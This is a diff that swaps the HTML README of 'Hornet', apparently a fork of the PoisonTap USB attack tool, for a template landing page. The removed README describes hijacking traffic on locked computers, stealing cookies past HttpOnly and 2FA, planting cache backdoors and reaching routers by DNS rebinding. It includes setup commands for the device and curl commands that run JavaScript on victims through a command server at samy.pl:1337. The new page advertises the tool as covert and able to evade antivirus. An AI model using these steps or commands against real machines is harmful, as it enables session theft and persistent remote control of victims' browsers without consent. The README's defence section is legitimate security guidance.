@@ -1,202 +1,164 @@
-<h1 id="hornet---siphons-cookies-exposes-internal-router-installs-web-backdoor-on-locked-computers"><a href="https://samy.pl/poisontap/">Hornet</a> - siphons cookies, exposes internal router &amp; installs web backdoor on locked computers</h1>
-<p>Forked by <a href="https://twitter.com/_Thisas_" target=_blank><span class="citation">@_thisas_</span></a> || <a href="https://thisas.dev" target=_blank>https://thisas.dev</a></p>
-<p>When <strong><a href="https://samy.pl/poisontap">Hornet</a></strong> (<a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a> &amp; Node.js) is plugged into a <strong>locked/password protected</strong> computer, it:</p>
-<ul>
-<li>emulates an Ethernet device over USB (or Thunderbolt)</li>
-<li>hijacks <strong>all Internet traffic</strong> from the machine (<em>despite</em> being a low priority/unknown network interface)</li>
-<li>siphons and stores HTTP cookies and sessions from the web browser for the Alexa top 1,000,000 websites</li>
-<li>exposes the <strong>internal router</strong> to the attacker, making it accessible <strong>remotely</strong> via outbound WebSocket and DNS rebinding (thanks <a href="https://maustin.net" target=_blank>Matt Austin</a> for rebinding idea!)</li>
-<li>installs a persistent web-based backdoor in HTTP cache for hundreds of thousands of domains and common Javascript CDN URLs, all with access to the user's cookies via cache poisoning</li>
-<li>allows attacker to <strong>remotely</strong> force the user to make HTTP requests and proxy back responses (GET &amp; POSTs) with the <strong>user's cookies</strong> on any backdoored domain</li>
-<li>does <strong>not</strong> require the machine to be unlocked</li>
-<li>backdoors and remote access persist <strong>even after device is removed</strong> and attacker sashays away</li>
-</ul>
-<div class="figure">
-<img src="https://samy.pl/poisontap/cropped6.gif" alt="Hornet" /><p class="caption">Hornet</p>
-</div>
-<p><em>(incredible HTML5 canvas animation by <a href="https://codepen.io/ara_node/" target="_blank">Ara</a>)</em></p>
-<h3 id="hornet-evades-the-following-security-mechanisms">Hornet evades the following security mechanisms:</h3>
-<ul>
-<li><a href="https://www.wikiwand.com/en/Lock_screen" target=_blank>Password Protected Lock Screens</a></li>
-<li><a href="https://www.wikiwand.com/en/Routing_table" target=_blank>Routing Table</a> priority and network interface Service Order</li>
-<li><a href="https://www.wikiwand.com/en/Same-origin_policy" target=_blank>Same-Origin Policy</a></li>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options" target=_blank>X-Frame-Options</a></li>
-<li><a href="https://www.owasp.org/index.php/HttpOnly" target=_blank>HttpOnly</a> Cookies</li>
-<li><a href="https://www.chromestatus.com/feature/4672634709082112" target=_blank>SameSite</a> cookie attribute</li>
-<li><a href="https://www.wikiwand.com/en/Multi-factor_authentication" target=_blank>Two-Factor/Multi-Factor Authentication</a> (2FA/MFA)</li>
-<li><a href="https://www.wikiwand.com/en/DNS_rebinding" target=_blank>DNS Pinning</a></li>
-<li><a href="https://www.wikiwand.com/en/Cross-origin_resource_sharing" target=_blank>Cross-Origin Resource Sharing (CORS)</a></li>
-<li><a href="https://www.wikiwand.com/en/HTTPS" target=_blank>HTTPS cookie protection</a> when <a href="https://www.owasp.org/index.php/SecureFlag" target=_blank>Secure</a> cookie flag &amp; <a href="https://www.wikiwand.com/en/HTTP_Strict_Transport_Security" target=_blank>HSTS</a> not enabled</li>
-</ul>
-<hr />
-<h1 id="demo">Demo</h1>
-<p>Hornet is built for the $5 <a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a> without any additional components other than a <a href="https://amzn.to/2fUMdah" target="_blank">micro-USB cable</a> &amp; <a href="https://amzn.to/2fWgKsd" target="_blank">microSD card</a>, or can work on any Raspberry Pi (1/2/3) with an Ethernet-to-USB/Thunderbolt dongle, or can work on other devices that can emulate USB gadgets such as <a href="https://inversepath.com/usbarmory" target="_blank">USB Armory</a> and <a href="https://lanturtle.com/" target=_blank>LAN Turtle</a>.</p>
-<p><strong>Live demonstration</strong> and more details available in the video: <a href="https://www.youtube.com/watch?v=Aatp5gCskvk" target="_blank"><img src= "https://samy.pl/poisontap/ptap-thumbnail-small.png" alt="MagSpoof" border="1" /></a></p>
-<p><strong>Point of Contact:</strong> <a href="https://twitter.com/_thisas_" target=_blank><span class="citation">@_Thisas_</span></a> // <a href="https://thisas.dev" target=_blank>https://thisas.dev</a></p>
-<p><strong>Released:</strong> 12 August 2020</p>
-<p><strong>Source code and download:</strong> <a href="https://github.com/_thisas_/hornet" target=_blank>https://github.com/<em>thisas</em>/hornet</a></p>
-<hr />
-<h1 id="how-hornet-works">How Hornet Works</h1>
-<p>Hornet produces a cascading effect by exploiting the existing trust in various mechanisms of a machine and network, including USB/Thunderbolt, DHCP, DNS, and HTTP, to produce a snowball effect of information exfiltration, network access and installation of semi-permanent backdoors.</p>
-<div class="figure">
-<embed src="https://samy.pl/poisontap/network2.gif?" /><p class="caption">Network Hijacking</p>
-</div>
-<p>In a nutshell, Hornet performs the following:</p>
-<h3 id="network-hijacking"><em>Network Hijacking</em></h3>
-<ul>
-<li>Attacker plugs Hornet (such as weaponized <a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a>) into a locked computer (even if computer is password protected)</li>
-<li>Hornet emulates an Ethernet device (eg, Ethernet over USB/Thunderbolt) -- by default, Windows, OS X and Linux recognize an ethernet device, automatically loading it as a low-priority network device and performing a DHCP request across it, <strong>even when the machine is locked or password protected</strong></li>
-<li>Hornet responds to the DHCP request and provides the machine with an IP address, however the DHCP response is crafted to tell the machine that the entire IPv4 space (0.0.0.0 - 255.255.255.255) is part of the Hornet's local network, rather than a small subnet (eg 192.168.0.0 - 192.168.0.255)</li>
-<li>Normally it would be irrelevant if a secondary network device connects to a machine as it will be given lower priority than the existing (trusted) network device and won't supersede the gateway for Internet traffic, <em>but...</em></li>
-<li>Any routing table / gateway priority / network interface service order security is <strong>bypassed</strong> due to the priority of &quot;LAN traffic&quot; over &quot;Internet traffic&quot;</li>
-<li>Hornet exploits this network access, even as a low priority network device, because <strong>the <em>subnet</em> of a <em>low priority</em> network device is given higher priority than the <em>gateway</em> (default route) of the <em>highest priority</em> network device</strong></li>
-<li>This means if traffic is destined to 1.2.3.4, while normally this traffic would hit the default route/gateway of the primary (non-Hornet) network device, Hornet actually gets the traffic because the Hornet &quot;local&quot; network/subnet supposedly contains 1.2.3.4, and every other IP address in existence ;)</li>
-<li>Because of this, all Internet traffic goes over Hornet, even though the machine is connected to another network device with higher priority and proper gateway (the true wifi, ethernet, etc.)</li>
-</ul>
-<div class="figure">
-<img src="https://samy.pl/poisontap/cookies2.gif" alt="Cookie Siphoning" /><p class="caption">Cookie Siphoning</p>
-</div>
-<h3 id="cookie-siphoning"><em>Cookie Siphoning</em></h3>
-<ul>
-<li>As long as a web browser is running the background, it is likely one of the open pages will perform an HTTP request in the background (for example to load a new ad, send data to an analytics platform, or simply continue to <a href="https://samy.pl/evercookie/">track your web movements</a>) via AJAX or dynamic script/iframe tags</li>
-<li>You can see this for yourself, go into your devtools/inspector (typically Cmd+Shift+I or Ctrl+Shift+I), go to a heavily visited website, click on the Network tab, and watch as remote resources continue to be accessed even as you take no action on the page</li>
-<li>Upon this HTTP request, because all traffic exits onto the Hornet device, Hornet DNS spoofs on the fly to return its own address, causing the HTTP request to hit the Hornet web server (<a href="https://nodejs.org/" target="_blank">Node.js</a>)
-<ul>
-<li>If the DNS server is pointing to an internal IP (LAN) that Hornet cannot get privilege for, the attack continues to function as the internal DNS server will produce public IP addresses for the various domains attacked, and it is the public IP addresses that Hornet has already hijacked</li>
-<li>Once the internal DNS server responds, the web browser hits the public IP, ultimately hitting the Hornet web server (Node.js) in either scenario</li>
-</ul></li>
-<li>When the Node web server receives the request, Hornet responds with a response that can be interpreted as HTML or as Javascript, both of which execute properly (many websites will load HTML or JS in background requests)</li>
-<li>The HTML/JS-agnostic page then produces many hidden iframes, each iframe across a different Alexa-top-1-million domain</li>
-<li>Any &quot;X-Frame-Options&quot; security on the domain is <strong>bypassed</strong> as Hornet is now the HTTP server and chooses which headers to send to the client</li>
-<li>As every iframe HTTP request to a site is made (eg, http://nfl.com/PoisonTap), the HTTP cookies are sent from the browser to the &quot;public IP&quot; hijacked by Hornet, which swiftly logs the cookies/authentication information, <strong>logging tens of thousands of the user's cookies into Hornet</strong></li>
-<li>Any &quot;HttpOnly&quot; cookie security is <strong>bypassed</strong> and those cookies are captured as no Javascript is executed on the domain itself, but rather only used to load the iframe in the first place</li>
-<li>Any Cross-Origin Resource Sharing or Same-Origin Policy security is <strong>bypassed</strong> as the domain being accessed appears legitimate to the browser</li>
-<li>Because we're capturing cookies rather than credentials, any 2FA/MFA implemented on the site is <strong>bypassed</strong> when the attacker uses the cookie to login. This is because we're not actually performing the login function but rather continuing an already logged-in session which does <strong>not</strong> trigger two-factor authentication</li>
-<li>If a server is using HTTPS, but the cookies do not explicitly set the <a href="https://www.owasp.org/index.php/SecureFlag" target="_blank">Secure</a> cookie flag, the HTTPS protection is <strong>bypassed</strong> and the cookie is sent to Hornet</li>
-</ul>
-<div class="figure">
-<img src="https://samy.pl/poisontap/router2.gif" alt="Internal Router Backdoor" /><p class="caption">Internal Router Backdoor</p>
-</div>
-<h3 id="remotely-accessible-web-based-backdoors"><em>Remotely Accessible Web-Based Backdoors</em></h3>
-<ul>
-<li>While Hornet was producing thousands of iframes, forcing the browser to load each one, these iframes are not just blank pages at all, but rather <strong>HTML+Javascript backdoors</strong> that are <strong>cached indefinitely</strong></li>
-<li>Because Hornet force-caches these backdoors on each domain, the backdoor is tied to that domain, enabling the attacker to use the domain's cookies and launch same-origin requests in the future, even if the user is currently not logged in</li>
-<li>For example, when the http://nfl.com/Hornet iframe is loaded, Hornet accepts the diverted Internet traffic, responds to the HTTP request via the Node web server</li>
-<li>Additional HTTP headers are added to cache the page indefinitely</li>
-<li>The actual response of the page is a combination of HTML and Javascript that produces a persistent WebSocket out to the attacker's web server (over the Internet, not on the Hornet device)</li>
-<li>The WebSocket remains open allowing the attacker to, at any point in the future, connect back to the backdoored machine and perform requests across any origin that has the backdoor implemented (the Alexa top 1,000,000 sites -- see below)</li>
-<li>If the backdoor is opened on one site (e.g., nfl.com), but the user wishes to attack a different domain (e.g., pinterest.com), the attacker can load an iframe on nfl.com to the pinterest.com backdoor (http://pinterest.com/Hornet)</li>
-<li>Again, any &quot;X-Frame-Options&quot;, Cross-Origin Resource Sharing, and Same-Origin Policy security on the domain is entirely <strong>bypassed</strong> as the request will hit the cache that Hornet left rather than the true domain</li>
-</ul>
-<p><a href="http://amzn.to/2eMr2WY" target="_blank"><embed src="https://samy.pl/poisontap/straightened.jpg?0" /></a></p>
-<h3 id="internal-router-backdoor-remote-access"><em>Internal Router Backdoor &amp; Remote Access</em></h3>
-<ul>
-<li>The one network Hornet is not able to hijack is the actual LAN subnet of the true network interface (for example, if the user's wifi subnet is 192.168.0.x, this network is unaffected), <em>but...</em></li>
-<li>Hornet force-caches a backdoor on a special host, specifically the target router's IP prepended to &quot;.ip.samy.pl&quot;, e.g. 192.168.0.1.ip.samy.pl, essentially producing a <strong>persistent</strong> DNS rebinding attack</li>
-<li>When using Hornet as the DNS server (victim using public DNS server), Hornet responds with the specialized Hornet IP temporarily (1.0.0.1), meaning any requests at that moment will hit the Hornet web server</li>
-<li>If instead the DNS server is set to the internal network (e.g., 192.168.0.x), an additional specially crafted request is made to 1.0.0.1<strong>.pin.</strong>ip.samy.pl which tells my specialized DNS server (on the public Internet) to <strong>temporarily</strong> respond to any [ip.address].ip.samy.pl address with the &quot;pinned&quot; address (1.0.0.1) for several seconds</li>
-<li>Hornet then quickly sets a backdoor on http://192.168.0.1.ip.samy.pl/Hornet, which for the moment points to the Hornet device at 1.0.0.1, allowing the backdoor to be accessed and cached from the Hornet device</li>
-<li>DNS pinning and DNS rebinding security are <strong>bypassed</strong> due to exhausting the DNS pinning table, due to the hundreds of thousands of requests just previously made, and no rebinding needs to occur in the future, making this attack persistent over long periods of time (thanks to <a href="https://maustin.net" target=_blank>Matt Austin</a> for sharing this attack with me!)</li>
-<li>Now that a backdoor is force-cached to http://192.168.0.1.ip.samy.pl/Hornet, any future requests to the 192.168.0.1.ip.samy.pl will hit the <strong>unpinned</strong> IP address, causing 192.168.0.1 to resolve instead, pointing directly to the router</li>
-<li>This means if loading the 192.168.0.1.ip.samy.pl/Hornet host in an iframe remotely over the backdoor, you can now perform AJAX GET/POSTs to <strong>any other page</strong> on the internal router, <strong>entirely remotely</strong>, thus allowing remote access to the internal router</li>
-<li>This can lead to other attacks on the router which the attacker may have never had access to in the first place, such as default admin credentials on the router being used to overwrite DNS servers, or other authentication vulnerabilities being exposed</li>
-</ul>
-<p><img src="https://samy.pl/poisontap/pin2.png?1" alt="DNS Rebinding" /></p>
-<h4 id="recap-of-the-dns-server">Recap of the DNS server:</h4>
-<ul>
-<li>[ip.addy].ip.samy.pl <strong>normally</strong> responds with [ip.addy]</li>
-<li>192.168.0.1.ip.samy.pl -&gt; 192.168.0.1 (A record)</li>
-<li>[ip.addy].pin.ip.samy.pl <strong>temporarily</strong> (~5 seconds) points *.ip.samy.pl to [ip.addy]</li>
-<li>1.0.0.1.pin.ip.samy.pl -&gt; 1.0.0.1</li>
-<li>192.168.0.1.ip.samy.pl -&gt; 1.0.0.1 (A record, short TTL)</li>
-<li><em>(after ~5 seconds)</em></li>
-<li>192.168.0.1.ip.samy.pl -&gt; 192.168.0.1 (A record)</li>
-</ul>
-<h3 id="additional-remotely-accessible-web-based-backdoors">Additional Remotely Accessible Web-Based Backdoors</h3>
-<ul>
-<li>Additionally, Hornet replaces thousands of common, CDN-based Javascript files, e.g. Google and jQuery CDNs, with the correct code plus a backdoor that gives the attacker access to any domain loading the infected CDN-based Javascript file</li>
-<li>Because a backdoor is left on each domain, this allows the attacker to remotely force the backdoored browser to perform <strong>same-origin</strong> requests (AJAX GET/POSTs) on virtually any major domain, even if the victim does not currently have any open windows to that domain</li>
-<li>The backdoor will now live on any additional site that also uses one of these infected, HTTP-based, CDN Javascript frameworks when the victim visits the site</li>
-</ul>
-<hr />
-<div class="figure">
-<img src="https://samy.pl/poisontap/ptplug.jpg" alt="Hornet" /><p class="caption">Hornet</p>
-</div>
-<h1 id="securing-against-hornet">Securing Against Hornet</h1>
-<h3 id="server-side-security">Server-Side Security</h3>
-<p>If you are running a web server, securing against Hornet is simple:</p>
-<ul>
-<li><strong>Use HTTPS exclusively</strong>, at the very least for authentication and authenticated content</li>
-<li>Honestly, you should use HTTPS exclusively and always redirect HTTP content to HTTPS, preventing a user being tricked into providing credentials or other PII over HTTP</li>
-<li>Ensure Secure flag is enabled on cookies, preventing HTTPS cookies from leaking over HTTP</li>
-<li>When using remote Javascript resources, use the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" target=_blank>Subresource Integrity</a> script tag attribute</li>
-<li>Use <a href="https://www.wikiwand.com/en/HTTP_Strict_Transport_Security" target=_blank>HSTS</a> to prevent HTTPS downgrade attacks</li>
-</ul>
-<h3 id="desktop-security">Desktop Security</h3>
-<ul>
-<li>Adding <a href="https://amzn.to/2fX0I1e" target=_blank>cement</a> to your USB and Thunderbolt ports can be effective</li>
-<li>Closing your browser every time you walk away from your machine can work, but is entirely impractical</li>
-<li>Disabling USB/Thunderbolt ports is also effective, though also impractical</li>
-<li>Locking your computer has <strong>no effect</strong> as the network and USB stacks operate while the machine is locked, however, going into an encrypted sleep mode where a key is required to decrypt memory (e.g., FileVault2 + deep sleep) solves most of the issues as your browser will no longer make requests, even if woken up</li>
-</ul>
-<table>
-<col width="6%" />
-<tbody>
-<tr class="odd">
-<td align="left"># Download</td>
-</tr>
-<tr class="even">
-<td align="left"><strong>Source code:</strong> <a href="https://github.com/_thisas_/hornet" target=_blank>https://github.com/<em>thisas</em>/hornet</a></td>
-</tr>
-</tbody>
-</table>
-<h1 id="installation-file-breakdown">Installation / File Breakdown</h1>
-<p>Note: If you find the device is NOT acting as an Ethernet controller automatically (older versions of Windows, for example), you can <a href="https://github.com/_thisas_/hornet/issues/8#issuecomment-265818957">change the VID and PID in pi_startup.sh</a></p>
-<pre class="sourceCode bash"><code class="sourceCode bash"><span class="co"># Instructions adjusted from https://gist.github.com/gbaman/50b6cca61dd1c3f88f41</span>
-<span class="kw">sudo</span> bash
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<title>Project Hornet</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
+	</head>
+	<body class="landing is-preload">
 
-<span class="co"># If Raspbian BEFORE 2016-05-10, then run next line:</span>
-<span class="ot">BRANCH=</span>next <span class="kw">rpi-update</span>
+		<!-- Page Wrapper -->
+			<div id="page-wrapper">
 
-<span class="kw">echo</span> -e <span class="st">&quot;\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0&quot;</span> <span class="kw">&gt;&gt;</span> /etc/network/interfaces
-<span class="kw">echo</span> <span class="st">&quot;dtoverlay=dwc2&quot;</span> <span class="kw">&gt;&gt;</span> /boot/config.txt
-<span class="kw">echo</span> -e <span class="st">&quot;dwc2\ng_ether&quot;</span> <span class="kw">&gt;&gt;</span> /etc/modules
-<span class="kw">sudo</span> sed --in-place <span class="st">&quot;/exit 0/d&quot;</span> /etc/rc.local
-<span class="kw">echo</span> <span class="st">&quot;/bin/sh /home/pi/Hornet/pi_startup.sh&quot;</span> <span class="kw">&gt;&gt;</span> /etc/rc.local
-<span class="kw">mkdir</span> /home/pi/Hornet
-<span class="kw">chown</span> -R pi /home/pi/Hornet
-<span class="kw">apt-get</span> update <span class="kw">&amp;&amp;</span> <span class="kw">apt-get</span> upgrade
-<span class="kw">apt-get</span> -y install isc-dhcp-server dsniff screen nodejs</code></pre>
-<p>Place dhcpd.conf in /etc/dhcp/dhcpd.conf and the rest of the files in /home/pi/Hornet, then reboot to ensure everything is working.</p>
-<p>There are a number of <a href="https://github.com/The_Real_Thisas/Hornet" target=_blank>files in the repo</a>, which are used on different sides. The list:</p>
-<ul>
-<li><strong>backdoor.html</strong> - Whenever a http://hostname/Hornet URL is hit to exfiltrate cookies, this file is what is returned as the force-cached content. It contains a backdoor that produces an outbound websocket to samy.pl:1337 (adjustable to any host/port) that remains opens waiting for commands from the server. This means when you load an iframe on a site, such as http://hostname/Hornet, this is the content that gets populated (even after Hornet is removed from the machine).</li>
-<li><strong>backend_server.js</strong> - This is the Node.js server that you run on your Internet-accessible server. It is what the backdoor.html connects to (eg, samy.pl:1337). This is the same server you connect to send commands to your stung minion machines, eg</li>
-</ul>
-<pre class="sourceCode bash"><code class="sourceCode bash"><span class="co"># pop alert to victim</span>
-<span class="kw">curl</span> <span class="st">&#39;http://samy.pl:1337/exec?alert(&quot;muahahahaha&quot;)&#39;</span>
-<span class="co"># to set a cookie on victim</span>
-<span class="kw">curl</span> <span class="st">&#39;http://samy.pl:1337/exec?document.cookie=&quot;key=value&quot;&#39;</span>
-<span class="co"># to force victim to load a url via ajax (note, jQuery is stored inside the backdoor)</span>
-<span class="kw">curl</span> <span class="st">&#39;http://samy.pl:1337/exec?$.get(&quot;http://192.168.0.1.ip.samy.pl/login&quot;,function(d)\{console.log(d)\})&#39;</span></code></pre>
-<ul>
-<li><strong>pi_Hornet.js</strong> - This runs via Node.js on the Raspberry Pi Zero and is the HTTP server responsible for handling any HTTP requests intercepted by Hornet, storing siphoned cookies, and injecting the cached backdoors.</li>
-<li><strong>pi_startup.sh</strong> - This runs upon startup on the Raspberry Pi Zero in order to set the device up to emulate an Ethernet-over-USB gadget, set up our evil DHCP server, allow traffic rerouting, DNS spoofing, and to launch pi_Hornet.js above.</li>
-<li><strong>target_backdoor.js</strong> - This file is prepended to any CDN-related Javascript files, thus backdooring them, e.g. Google CDN's jQuery URL.</li>
-<li><strong>target_injected_xhtmljs.html</strong> - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara oen CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by Hornet.</li>
-<li><strong>Hornet.cookies.log</strong> - This file is generated once the user's machine starts sending HTTP requests to Hornet and logs the cookie from the browser along with the associated URL/domain it belongs to.</li>
-</ul>
-<hr />
-<h1 id="frequently-asked-questions">Frequently Asked Questions</h1>
-<ul>
-<li><strong>Q:</strong> How do you add additional domains to be backdoored?</li>
-<li><strong>A:</strong> The list of domains to be backdoored is set in <code>target_injected_xhtmljs.html</code> by the <code>getDoms()</code> function. This itself is populated by the <code>alexa1m.sh</code> script in the root of the repo. If you wish to add additional domains to this list, you can simply amend the return call in <code>getDoms()</code>.</li>
-<li><strong>Q:</strong> How do you use the captured cookies?</li>
-<li><strong>A:</strong> You can use the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie">Document.cookie API</a> directly from the JavaScript console in your browser to set cookies. <a href="https://superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome">This StackOverflow post</a> also has a few Chrome-specific suggestions, for example the <a href="https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn">Cookie Inspector</a> Chrome extension.</li>
-<li><strong>Q:</strong> How do I clean Hornet from a machine?</li>
-<li><strong>A:</strong> You should clear the local OS DNS cache, as well as any browser caches. You may also need to invalidate any logged-in sessions at the time, which may have leaked cookies. Ensure that these invalidate existing cookies, rather than simply logging you out. (If you want to safetly work with a Hornet device on your current machine, make sure to exit any browser, then you should be able to safetly connect it to your machine).</li>
-</ul>
-<hr />
-<h1 id="contact">Contact</h1>
-<p><strong>Point of Contact:</strong> <a href="https://twitter.com/samykamkar" target=_blank><span class="citation">@SamyKamkar</span></a></p>
-<p>You can see more of my projects or contact me at <a href="https://samy.pl" target=_blank>https://samy.pl</a>.</p>
+				<!-- Header -->
+					<header id="header" class="alt">
+						<h1><a href="index.html">Hornet</a></h1>
+						<nav id="nav">
+							<ul>
+								<li class="special">
+									<a href="#menu" class="menuToggle"><span>Menu</span></a>
+									<div id="menu">
+										<ul>
+											<li><a href="index.html">Home</a></li>
+											<!-- <li><a href="generic.html">Generic</a></li>
+											<li><a href="elements.html">Elements</a></li>
+											<li><a href="#">Sign Up</a></li>
+											<li><a href="#">Log In</a></li> -->
+										</ul>
+									</div>
+								</li>
+							</ul>
+						</nav>
+					</header>
+
+				<!-- Banner -->
+					<section id="banner">
+						<div class="inner">
+							<h2>Project Hornet</h2>
+							<p>Fork of the original <a href="http://samy.pl/poisontap">poisontap</a> project <br /> by <a href="https://thisas.dev">Thsias</a>.</p>
+							<ul class="actions special">
+								<li><a href="#" class="button primary">Activate</a></li>
+							</ul>
+						</div>
+						<a href="#one" class="more scrolly">Learn More</a>
+					</section>
+
+				<!-- One -->
+					<section id="one" class="wrapper style1 special">
+						<div class="inner">
+							<header class="major">
+								<h2>An attempt to recreate and continue the OG poisontap </h2>
+								<p>Hornet is an attempt to recreate poisontap as part of a professional pentest tool<br />
+								that is capable of being covertly deployed and executed.</p>
+							</header>
+							<ul class="icons major">
+								<li><a href="#"><span class="icon fa-heart major style2"><span class="label">Love our project? Heart us on Github.</span></span></a></li>
+								<li><a href="#"><span class="icon solid fa-code major style3"><span class="label">Check out the code on Github.</span></span></a></li>
+								<li><a href="#"><span class="icon solid fa-video major style3"><span class="label">See it in action.</span></span></a></li>
+
+							</ul>
+						</div>
+					</section>
+
+				<!-- Two -->
+					<section id="two" class="wrapper alt style2">
+						<section class="spotlight">
+							<div class="image"><img src="images/pic01.jpg" alt="" /></div><div class="content">
+								<h2>Quick</h2>
+								<p>If the deploying device is powered beforehand, Hornet deploys instantly and finishes with the attack within seconds. Making the interaction less suspicious.</p>
+							</div>
+						</section>
+						<section class="spotlight">
+							<div class="image"><img src="images/pic02.jpg" alt="" /></div><div class="content">
+								<h2>Covert</h2>
+								<p>Due to the fact that computers automatically trust ethernet based connections, Hornet can be deployed even when the target is locked. Furthermore the injected code is disguised to look like any other cookie making it unnoticeable to users and even antivirus.</p>
+							</div>
+						</section>
+						<section class="spotlight">
+							<div class="image"><img src="images/pic03.jpg" alt="" /></div><div class="content">
+								<h2>Remote</h2>
+								<p>Once Hornet has been injected into the target machine, it allows for remote js execution via a command and control server .</p>
+							</div>
+						</section>
+					</section>
+
+				<!-- Three -->
+					<!-- <section id="three" class="wrapper style3 special">
+						<div class="inner">
+							<header class="major">
+								<h2>Accumsan mus tortor nunc aliquet</h2>
+								<p>Aliquam ut ex ut augue consectetur interdum. Donec amet imperdiet eleifend<br />
+								fringilla tincidunt. Nullam dui leo Aenean mi ligula, rhoncus ullamcorper.</p>
+							</header>
+							<ul class="features">
+								<li class="icon fa-paper-plane">
+									<h3>Arcu accumsan</h3>
+									<p>Augue consectetur sed interdum imperdiet et ipsum. Mauris lorem tincidunt nullam amet leo Aenean ligula consequat consequat.</p>
+								</li>
+								<li class="icon solid fa-laptop">
+									<h3>Ac Augue Eget</h3>
+									<p>Augue consectetur sed interdum imperdiet et ipsum. Mauris lorem tincidunt nullam amet leo Aenean ligula consequat consequat.</p>
+								</li>
+								<li class="icon solid fa-code">
+									<h3>Mus Scelerisque</h3>
+									<p>Augue consectetur sed interdum imperdiet et ipsum. Mauris lorem tincidunt nullam amet leo Aenean ligula consequat consequat.</p>
+								</li>
+								<li class="icon solid fa-headphones-alt">
+									<h3>Mauris Imperdiet</h3>
+									<p>Augue consectetur sed interdum imperdiet et ipsum. Mauris lorem tincidunt nullam amet leo Aenean ligula consequat consequat.</p>
+								</li>
+								<li class="icon fa-heart">
+									<h3>Aenean Primis</h3>
+									<p>Augue consectetur sed interdum imperdiet et ipsum. Mauris lorem tincidunt nullam amet leo Aenean ligula consequat consequat.</p>
+								</li>
+								<li class="icon fa-flag">
+									<h3>Tortor Ut</h3>
+									<p>Augue consectetur sed interdum imperdiet et ipsum. Mauris lorem tincidunt nullam amet leo Aenean ligula consequat consequat.</p>
+								</li>
+							</ul>
+						</div>
+					</section> -->
+
+				<!-- CTA -->
+					<!-- <section id="cta" class="wrapper style4">
+						<div class="inner">
+							<header>
+								<h2>Arcue ut vel commodo</h2>
+								<p>Aliquam ut ex ut augue consectetur interdum endrerit imperdiet amet eleifend fringilla.</p>
+							</header>
+							<ul class="actions stacked">
+								<li><a href="#" class="button fit primary">Activate</a></li>
+								<li><a href="#" class="button fit">Learn More</a></li>
+							</ul>
+						</div>
+					</section> -->
+
+				<!-- Footer -->
+					<footer id="footer">
+						<ul class="icons">
+							<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+							<!-- <li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li> -->
+							<li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
+							<!-- <li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li> -->
+							<li><a href="#" class="icon solid fa-envelope"><span class="label">Email</span></a></li>
+						</ul>
+						<ul class="copyright">
+							<li>&copy; Thisas</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+						</ul>
+					</footer>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
